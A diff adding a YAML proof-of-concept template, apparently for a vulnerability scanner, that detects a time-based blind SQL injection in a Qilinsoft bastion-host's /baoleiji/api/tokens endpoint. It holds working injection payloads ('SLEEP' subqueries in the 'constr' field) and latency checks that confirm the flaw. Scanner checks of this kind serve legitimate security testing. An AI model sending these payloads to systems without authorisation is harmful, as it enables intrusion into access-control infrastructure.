@@ -1,0 +1,44 @@
+name: poc-yaml-qilinsoft-tokens-sqli
+manual: true
+transport: http
+set:
+    sleepSecond1: randomInt(6, 8)
+    sleepSecond2: randomInt(3, 5)
+rules:
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /baoleiji/api/tokens
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(0)))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+            follow_redirects: false
+        expression: response.status == 403
+        output:
+            r0latency: response.latency
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /baoleiji/api/tokens
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP({{sleepSecond1}})))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+            follow_redirects: false
+        expression: response.status == 403 && response.latency - r0latency >= sleepSecond1 * 1000 - 1000
+    r4:
+        request:
+            cache: true
+            method: POST
+            path: /baoleiji/api/tokens
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP({{sleepSecond2}})))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+            follow_redirects: false
+        expression: response.status == 403 && response.latency - r0latency >= sleepSecond2 * 1000 - 1000
+expression: r2() && r3() && r4()
+detail:
+    author: secking
+    links:
+        - https://www.tosec.com.cn/
